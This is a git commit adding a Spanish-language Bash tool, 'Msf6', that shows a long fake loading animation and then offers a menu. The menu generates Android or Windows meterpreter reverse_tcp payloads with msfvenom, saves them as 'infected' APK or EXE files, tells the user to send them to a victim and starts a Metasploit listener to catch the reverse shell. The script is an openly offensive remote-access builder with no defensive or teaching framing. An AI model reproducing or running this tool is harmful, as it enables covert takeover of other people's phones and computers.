c153f9a386d0447fa0823585a9c5b91ca7c39bfc
MRX90902WX <118016739+MRX90902WX@users.noreply.github.com>
2022-11-26 21:24:02 -0500

    Add files via upload

---
+++ Msf6.sh
@@ -0,0 +1,517 @@
+#! /bin/bash
+
+echo""
+echo""
+echo""
+echo""
+echo""
+echo""
+echo""
+echo""
+echo"" 
+echo""
+echo""
+echo""
+echo""
+echo  ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo""
+echo""
+echo""
+echo""
+echo "               "/█1%...................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo  ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█4%....................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█8%......................./
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██10%....................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██12%....................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███15%..................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo ' 
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "               "/█████19%..................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "               "/██████28%..................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/████████30%................../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/██████████40%................/
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/█████████████50%............./
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/████████████████60%........../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███████████████████88%......./
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███████████████████93%...../
+sleep 0.0
+clear
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo " "
+echo '
+                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
+                     │  │ │├─┤ │││││││ ┬
+                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
+'
+echo " "
+echo " "
+echo " "
+echo " "
+echo "                "/███████████████████98%../
+sleep 1.0
+clear
+echo " "
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ' 
+
+
+
+
+'                     
+                       
+
+
+ 
+echo "                "[██████████████████████ 100%]
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+echo ""
+sleep 1.0
+clear
+
+clear
+setterm -foreground green
+figlet      Msf6
+setterm -foreground red
+echo "                                     v. 2.8"
+setterm -foreground green
+echo ""
+echo "          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+echo ""
+setterm -foreground white
+echo "           Recuerda antes de ingresar tu IP y PORT"
+echo ""
+echo "           La IP debe ser local a tu red wifi"
+echo "           Este ataque funciona dentro de tu red"
+echo ""
+echo "                   ifconfig"
+echo "                   Copia y pega la IP"
+echo ""
+echo "           Ejemplos"
+echo "                     ┌─[ IP ]"
+echo "                     └──>> 192.168.0.107"
+echo ""
+echo "                     ┌─[ PORT ]"
+echo "                     └──>> 5656"
+echo ""
+setterm -foreground green
+echo "          xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+echo ""
+while :
+do
+#MENU
+#Escojer menu
+echo -e "\e[1;33mSeleccione el payload que desea:\e[0m"
+echo ""
+echo -e "\e[1;35m[1]\e[0m\e[1;37m.\e[0m \e[1;36mAndroid\e[0m"
+echo -e "\e[1;35m[2]\e[0m\e[1;37m.\e[0m \e[1;36mWindows\e[0m"
+echo ""
+echo -n -e "\e[1;35m[\e[0m\e[1;31m*\e[0m\e[1;35m]\e[0m\e[1;37mOPCION\e[0m \e[1;32m>>\e[0m"
+read opcion
+#Seleccion de menu
+case $opcion in
+1)
+#! /bin/bash
+echo ""
+echo -e "\e[1;33mPayload\e[0m \e[1;31m==>\e[0m \e[1;32mandroid/meterpreter/reverse_tcp\e[0m"
+echo ""
+echo -e "\e[1;36m╔────────────────────────────────────────╗\e[0m"
+echo -e "\e[1;36m|\e[0m          \e[1;33mConfigurar Payload\e[0m\e[1;36m            |              \e[0m"
+echo -e "\e[1;36m┖────────────────────────────────────────┙\e[0m"
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32m IP \e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read ip
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32m PORT \e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read port
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32mNombre de la APK\e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read apk
+echo ""
+setterm -foreground yellow
+echo "Generando APK infectada ..."
+#ejecutar el payload
+msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /sdcard/$apk.apk
+
+echo ""
+echo -e "\e[1;33;41m$apk.apk se guardo en sus archivos de almacenamiento\e[0m"
+echo -e "\e[1;33;41mEnviar la apk a la victima despues de ejecutar el exploit\e[0m"
+echo ""
+echo "\\\\\\ Ejecutando metasploit framework ///////"
+#Iniciar metasploit
+msfconsole -q -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $port;exploit"
+#
+;;
+2)
+#! /bin/bash
+echo ""
+echo -e "\e[1;33mPayload\e[0m \e[1;31m==>\e[0m \e[1;32mwindows/meterpreter/reverse_tcp\e[0m"
+echo ""
+echo -e "\e[1;36m╔────────────────────────────────────────╗\e[0m"
+echo -e "\e[1;36m|\e[0m          \e[1;33mConfigurar Payload\e[0m\e[1;36m            |              \e[0m"
+echo -e "\e[1;36m┖────────────────────────────────────────┙\e[0m"
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32m IP \e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read ip
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32m PORT \e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read port
+echo ""
+echo -e "\e[1;31m┌─[\e[0m\e[1;32mNombre del EXE\e[0m\e[1;31m]\e[0m"
+    echo -n -e "\e[1;31m└──>>\e[0m "
+read exe
+echo ""
+setterm -foreground yellow
+echo "Generando EXE infectado ..."
+#ejecutar el payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=$port r > /sdcard/$exe.exe
+
+echo ""
+echo -e "\e[1;33;41m$exe.exe se guardo en sus archivos de almacenamiento\e[0m"
+echo -e "\e[1;33;41mEnviar el exe a la victima despues de ejecutar el exploit\e[0m"
+echo ""
+echo "\\\\\\ Ejecutando metasploit framework ///////"
+#Iniciar metasploit
+msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport $port;exploit"
+#
+;;
+esac
+done
---
+++ install.sh
@@ -0,0 +1,5 @@
+#! /bin/bash
+
+#instalar metasploit
+bash metasploit.sh
+#
